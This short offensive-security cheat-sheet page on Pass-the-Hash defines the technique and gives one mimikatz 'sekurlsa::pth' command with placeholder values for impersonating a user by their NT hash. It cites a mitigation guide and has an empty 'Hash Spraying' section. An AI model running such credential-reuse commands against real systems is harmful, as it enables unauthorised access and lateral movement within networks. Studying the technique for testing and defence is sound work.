---
label: Pass The Hash
---

# Pass the Hash

Pass-The-Hash is a general term used to describe a situation where we can provide a user's NT hash instead of a plaintext password to gain privileges. It is not tied to any specific service.

```powershell
# PtH and run cmd.exe with new privileges
mimikatz.exe
> sekurlsa::pth /user:<USER_NAME> /ntlm:<USER_NT_HASH> /domain:<DOMAIN>
```

## Hash Spraying

## References

* [HackingArticles.in, _Lateral Movement: Pass the Hash attack_](https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/)
* [Microsoft, _Mitigating Pass-the-Hash (PtH) Attacks and Other Credential Theft Techniques_ (PDF)](https://download.microsoft.com/download/7/7/a/77abc5bd-8320-41af-863c-6ecfb10cb4b9/mitigating%20pass-the-hash%20(pth)%20attacks%20and%20other%20credential%20theft%20techniques_english.pdf)
